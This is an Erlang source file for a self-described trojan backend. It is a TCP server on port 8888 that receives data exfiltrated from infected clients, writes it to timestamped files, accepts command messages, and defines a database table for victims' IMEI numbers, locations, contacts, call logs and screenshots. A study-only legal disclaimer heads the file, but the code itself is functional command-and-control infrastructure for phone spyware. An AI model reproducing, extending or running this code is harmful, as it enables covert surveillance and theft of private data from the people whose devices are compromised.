%% ============================================================================
%% @author 钟智强
%% @email johnmelodymel@qq.com
%%
%% ============================================================================
%% == 重要声明 ==
%% ============================================================================
%% 本程序仅供学习和技术研究使用，禁止将其用于任何未获授权的侵入、
%% 攻击、监听、干扰或其他违反网络安全和隐私保护的行为。
%%
%% 使用者必须在**完全理解并同意上述条款**的前提下使用本程序。
%% 任何将本程序用于**非法目的**的行为，其**所有后果**（包括但不限于
%% 行政处罚、民事赔偿、刑事责任）**均由使用者自行承担**。
%%
%% 请务必遵守您所在国家和地区的相关法律法规，特别是以下中国法律条款：
%%
%% - 《中华人民共和国网络安全法》 第十二条：任何个人和组织不得利用网络
%%   从事危害国家安全、荣誉和利益，煽动颠覆国家政权等违法犯罪活动。
%% - 《中华人民共和国刑法》 第二百八十五条至第二百八十七条：
%%   非法侵入计算机信息系统、破坏系统功能或数据的行为将被追究刑事责任。
%% - 《中华人民共和国数据安全法》 第三条、第十七条：
%%   从事数据处理活动应当依法保障数据安全，禁止非法获取、泄露数据。
%%
%% 💡特别提醒：本程序设计中可能涉及网络通信、数据收集、远程控制等功能，
%% 均应在**授权范围内**使用，任何对设备、系统、数据的未经授权的访问或控制
%% 都属于违法行为。
%%
%% 📛 违反以上条款造成的一切法律后果与责任，与作者无关。
%%
%% ============================================================================
%%
%% @doc 木马后台服务模块，提供TCP套接字监听和数据处理功能。
%% 主要功能包括：
%% - 创建Mnesia数据库表存储设备信息
%% - 监听指定端口接收客户端连接
%% - 处理每个连接的客户端数据
%% - 记录详细的连接和数据处理日志
%% 
%% 使用示例：
%% 1. 调用create_schema/0创建数据库架构
%% 2. 调用create_table/0创建设备信息表
%% 3. 调用start/0启动TCP监听服务
%% 
%% 日志级别支持：info, warning, error
%% 默认监听端口：8888
%% 默认IP地址：0.0.0.0

-module(trojan_socket).

-export([start/0]).
-export([create_schema/0, create_table/0]).
-export([
    print_banner/0,
    getIpInformation/1,
    ip_to_string/1,
    write_file/2, 
    random_color/0, 
    log/3,
    getCurrentLocalIPAddr/0,
    extract_value/2
]).

% 定义默认配置参数
-define(DEFAULT_NAME, "木马后台").    % 服务器默认名称
-define(DEFAULT_PORT, 8888).         % 默认监听端口
-define(DEFAULT_IP, {0,0,0,0}).      % 默认监听IP（所有网卡）
-define(DEFAULT_BUFSIZE, 1024).      % 默认缓冲区大小

% 设备信息记录结构，用于存储连接设备的各种信息
-record(device_info, {
    id,                 % 设备唯一标识符（整数或字符串）
    ip,                 % 设备IP地址
    image,              % 设备截图或图片（Base64编码或文件路径）
    current_location,   % 当前地理位置
    phone_number,       % 手机号码
    phone_model,        % 手机型号
    os_version,        % 操作系统版本
    network_carrier,   % 网络运营商
    imei_number,       % IMEI号码
    contacts,          % 通讯录（JSON格式）
    call_logs          % 通话记录（JSON格式）
}).

% ANSI 颜色代码 - 我们的小彩虹糖果盒！🍬🌈
-define(ANSI_RESET, "\e[0m").       % 变回原来的颜色哦
-define(ANSI_RED, "\e[31m").        % 热情的小红唇 💋
-define(ANSI_GREEN, "\e[32m").      % 清新的小绿叶 🌿
-define(ANSI_YELLOW, "\e[33m").     % 暖暖的小太阳 ☀️
-define(ANSI_BLUE, "\e[34m").       % 温柔的蓝天白云 ☁️
-define(ANSI_MAGENTA, "\e[35m").    % 可爱的小粉花 🌸
-define(ANSI_CYAN, "\e[36m").       % 清澈的小溪水 💧
-define(ANSI_WHITE, "\e[37m").      % 纯洁的小白兔 🐰

% 随机选择一个颜色的小函数～
random_color() ->
    Colors = [
        ?ANSI_RED, ?ANSI_GREEN, ?ANSI_YELLOW, 
        ?ANSI_BLUE, ?ANSI_MAGENTA, ?ANSI_CYAN, 
        ?ANSI_WHITE
    ],
    lists:nth(rand:uniform(length(Colors)), Colors).

% 新增的日志辅助函数，萌萌哒～
% 日志记录函数，支持不同级别的日志（info、warning、error）
% 每种级别使用不同的颜色，让日志更直观
log(Level, FormatString, Args) ->
    % 获取当前时间戳
    {{Y,Mo,D},{H,M,S}} = calendar:local_time(),
    % 格式化时间戳
    Timestamp = io_lib:format("~4..0w-~2..0w-~2..0w ~2..0w:~2..0w:~2..0w", [Y,Mo,D,H,M,S]),
    % 转换日志级别为字符串
    LevelStr = if
        is_atom(Level) -> atom_to_list(Level);
        is_list(Level) -> Level
    end,

    % 根据日志级别选择颜色
    Color = case Level of
        info    -> random_color();    % 普通信息用随机颜色
        warning -> ?ANSI_YELLOW;      % 警告用黄色
        error   -> ?ANSI_RED;         % 错误用红色
        _       -> random_color()     % 其他级别随机选色
    end,

    % 这里对 Args 里的每个参数都 flatten 一下，保证 ~s 能正常打印中英文
    % 只 flatten 字符串类型参数，其他类型保持原样
    SafeArgs = [if is_list(A) -> lists:flatten(A); true -> A end || A <- Args],
    io:format(Color ++ "~s [~s] " ++ FormatString ++ ?ANSI_RESET ++ "~n", 
             [Timestamp, LevelStr | SafeArgs]).

% 处理新的客户端连接
handle_connection(Socket) ->
    % 获取客户端IP地址
    case inet:peername(Socket) of
        {ok, PeerIP} ->
            log(info, "新的客户端连接，IP地址: ~p", [PeerIP]);
        {error, PeernameErrorReason} ->
            log(error, "获取客户端IP地址失败: ~p", [PeernameErrorReason])
    end,
    % 开始接收数据
    receive_all(Socket),
    % 关闭连接
    gen_tcp:close(Socket),
    log(info, "客户端连接已关闭", []).

% 处理收到的命令
handle_command(Command) ->
    log(info, "收到命令: ~s", [Command]),
    % 这里可以添加具体的命令处理逻辑
    ok.

% 循环接收客户端数据直到连接关闭
receive_all(Socket) ->
    log(info, "等待接收数据，Socket: ~p", [Socket]),
   
    case gen_tcp:recv(Socket, 0, 50000) of  % 50秒超时
        {ok, <<>>} ->
            % 收到空数据，继续等待
            log(info, "收到空数据，继续等待", []),
            receive_all(Socket);
        {ok, BinData} ->
            % 收到二进制数据
            log(info, "收到二进制数据: ~p", [BinData]),
            
            % 尝试将二进制数据转换为字符串（支持中文）
            case catch unicode:characters_to_list(BinData) of
                Str when is_list(Str) ->
                    log(info, "数据解码成功: ~s", [Str]),
                    % 检查是否包含数据标记
                    case string:find(Str, "[DATA]") of
                        nomatch ->
                            % 检查是否包含命令标记
                            case string:find(Str, "[COMMAND]") of
                                nomatch ->
                                    log(warning, "数据没有识别标签，忽略", []);
                                _ ->
                                    % 提取并处理命令
                                    [_, Command] = string:split(Str, "[COMMAND]"),
                                    log(info, "发现命令: ~s", [Command]),
                                    handle_command(Command)
                            end;
                        _ ->
                            % 提取并保存数据
                            [_, Data] = string:split(Str, "[DATA]"),
                            log(info, "提取的数据: ~s", [Data]),
                            % 生成带时间戳的文件名
                            {{Y, Mo, D}, {H, Mi, S}} = calendar:local_time(),
                            Timestamp = io_lib:format(
                                "~4..0w-~2..0w-~2..0w_~2..0w-~2..0w-~2..0w", 
                                [Y, Mo, D, H, Mi, S]
                            ),
                            Filename = lists:flatten(Timestamp) ++ "_data.txt",
                            write_file(Filename, Data)
                    end,
                    receive_all(Socket);
                _ ->
                    log(error, "数据解码失败", []),
                    receive_all(Socket)
            end;
        {error, timeout} ->
            log(warning, "接收超时", []);
        {error, closed} ->
            log(info, "客户端关闭连接", []);
        {error, RecvErrorReason} ->
            log(error, "接收数据错误: ~p", [RecvErrorReason])
    end.

% 这个新函数就是我们的“循环等待”魔法，让服务器能一直等待新的小可爱
accept_loop(ListenSocket) ->
    log(info, "服务器正在耐心等待新的小可爱连接中...", []), % 加个日志，表示正在等待 
    case gen_tcp:accept(ListenSocket) of
        {ok, Socket} ->
            % 有新的小可爱来啦！让 handle_connection 去招待它
            spawn(fun() -> handle_connection(Socket) end), % 为每个连接创建一个新进程，这样可以同时招待多个小可爱！
            accept_loop(ListenSocket); % 招待完（或者说，启动了招待进程后），马上回到这里，继续等待下一个！
        {error, closed} -> % 这个表示 ListenSocket 自己被关闭了，比如被其他地方的代码关了
            log(info, "监听的耳朵好像被关掉了，不再接受新的小可爱啦。", []);
        {error, AcceptErrorReason} ->
            % 如果是其他等待连接的错误，我们就记录下来，然后服务器就休息了（循环停止）
            log(error, "等待小可爱连接的时候出错了 (迎接小可爱的时候出错了): ~p. 服务器决定先休息一下。", [AcceptErrorReason])
            % 循环在这里通过不再次调用 accept_loop 来终止
    end.

% start/0 函数现在变得更简洁啦，它负责开启监听，然后把招待客人的任务交给 accept_loop
% 启动服务器
start() ->
    print_banner(),

    % 获取本地IP地址
    getCurrentLocalIPAddr(),

    % 启动Mnesia数据库
    mnesia:start(),
    
    % 开始监听端口
    case gen_tcp:listen(?DEFAULT_PORT, [
        binary,                % 使用二进制模式
        {ip, ?DEFAULT_IP},     % 监听所有网卡
        {packet, 0},           % 原始数据模式
        {active, false},       % 使用被动模式
        {reuseaddr, true},     % 允许地址重用
        {backlog, 5}           % 连接队列长度
    ]) of
        {ok, ListenSocket} ->
            log(info, "服务器启动成功，监听端口: ~p:~p", [?DEFAULT_IP, ?DEFAULT_PORT]),
            accept_loop(ListenSocket),
            gen_tcp:close(ListenSocket),
            log(info, "服务器已停止", []);
        {error, ListenErrorReason} ->
            log(error, "服务器启动失败: ~p", [ListenErrorReason])
    end.

create_table() ->
    mnesia:create_table(device_info, [
        {attributes, record_info(fields, device_info)},
        {disc_copies, [node()]},
        {type, set}
    ]).

% 创建 Mnesia 数据库架构
% 这个函数会在当前节点上创建一个新的 Mnesia 数据库架构
% 在启动服务器之前需要先调用这个函数来初始化数据库环境哦～
create_schema() ->
    mnesia:create_schema([node()]).

% 写入文件的小助手函数～
% 参数说明：
%   - Filename: 要写入的文件名（带路径）
%   - Content: 要写入的内容
% 返回值：
%   - ok: 写入成功
%   - {error, Reason}: 写入失败，Reason 说明失败原因
write_file(Filename, Content) ->
    case file:open(Filename, [append, write]) of
        {ok, ExportFile} ->
            ok = file:write(ExportFile, Content),
            ok = file:write(ExportFile, "\n"),  % 保证每次写完都换行，清清楚楚
            file:close(ExportFile),
            ok;
        {error, Reason} ->
            log(error, "无法打开文件 ~p 进行写入: ~p", [Filename, Reason]),
            {error, Reason}
    end.

getCurrentLocalIPAddr() ->
    case inet:getifaddrs() of
        {ok, Addrs} ->
            % 遍历所有网卡接口，提取其中的 IP 地址
            IPs = lists:flatmap(fun({_IfName, Props}) ->
                
            % 从属性列表中找到所有的 addr 项
                lists:filtermap(fun
                    ({addr, {A,B,C,D}}) when is_integer(A), is_integer(B), is_integer(C), is_integer(D) ->

                        % 只保留 IPv4 地址，并且不要 127.0.0.1
                        case {A,B,C,D} of
                            {127,0,0,1} -> false;  % 过滤掉本地回环地址
                            _ -> {true, io_lib:format("~B.~B.~B.~B", [A,B,C,D])}  % 把IP转成点分格式的字符串～
                        end;

                    (_) -> false  % 忽略其他所有项
                end, Props)
            end, Addrs),

            % 把所有 IP 打印出来，用漂亮的颜色～
            case IPs of
                [] ->
                    log(warning, "咦？没找到可用的 IP 地址耶～", []);
                _ ->
                    lists:foreach(fun(IP) ->
                        IPInfo = getIpInformation(IP),

                        log(info, "🎯 发现本地 IP 地址啦 >>> [http://~s:~p] <<<", [IP, ?DEFAULT_PORT]),
                        log(info, "🎯 :... ~p", [IPInfo])
                    end, IPs)
            end,
            IPs;

        {error, Reason} ->
            log(error, "❌ 获取 IP 地址失败了喵: ~p", [Reason]),
            []
    end.
    
ip_to_string({A, B, C, D}) ->
    lists:flatten(io_lib:format("~p.~p.~p.~p", [A, B, C, D])).

print_banner() ->
    Text = "
  ____              _     _                      
 |  _ \\            | |   | |                     
 | |_) | __ _ _ __ | |__ | | ___  ___ ___  _ __  
 |  _ < / _` | '_ \\| '_ \\| |/ _ \\/ __/ _ \\| '_ \\ 
 | |_) | (_| | | | | |_) | |  __/ (_| (_) | | | |
 |____/ \\__,_|_| |_|_.__/|_|\\___|\\___\\___/|_| |_|                                                  
",
    io:format("~s~n", [Text]).

getIpInformation(IP) -> 
    inets:start(),
    URL = "http://ip-api.com/json/" ++ IP,
    case httpc:request(get, {URL, []}, [], []) of
        {ok, {{_, 200, _}, _Headers, Body}} ->
            Status = extract_value(Body, <<"\"status\":\"">>),
            case Status of
                "success" ->
                    Country = extract_value(Body, <<"\"country\":\"">>),
                    Isp     = extract_value(Body, <<"\"isp\":\"">>),
                    Lat     = extract_value(Body, <<"\"lat\":">>),
                    Lon     = extract_value(Body, <<"\"lon\":">>),
                    {ok, #{country => Country, isp => Isp, lat => Lat, lon => Lon}};
                _ ->
                    Msg = extract_value(Body, <<"\"message\":\"">>),
                    io:format("⚠️ IP查询失败，原因：~s~n", [Msg]),
                    {error, Msg}
            end;
        {ok, {{_, Code, _}, _, _}} ->
            io:format("⚠️ HTTP 请求失败，状态码：~p~n", [Code]),
            {error, Code};
        {error, Reason} ->
            io:format("💥 请求出错：~p~n", [Reason]),
            {error, Reason}
    end.

extract_value(Binary, Key) ->
    % 保证 Binary 一定是二进制
    Bin = case is_binary(Binary) of
        true -> Binary;
        false -> list_to_binary(Binary)
    end,
    case binary:match(Bin, Key) of
        {Start, _Len} ->
            % 计算剩余长度，避免越界
            RemainingLen = byte_size(Bin) - (Start + byte_size(Key)),
            % 取剩余部分，而不是固定的64字符
            AfterKey = binary:part(Bin, Start + byte_size(Key), RemainingLen),
            End = case binary:match(AfterKey, <<",">>) of
                      {Pos, _} -> Pos;
                      nomatch ->
                          case binary:match(AfterKey, <<"\"">>) of
                              {Pos2, _} -> Pos2;
                              _ -> RemainingLen
                          end
                  end,
            Clean = binary:part(AfterKey, 0, End),
            string:trim(binary_to_list(Clean), both, "\"");
        nomatch ->
            "N/A"
    end.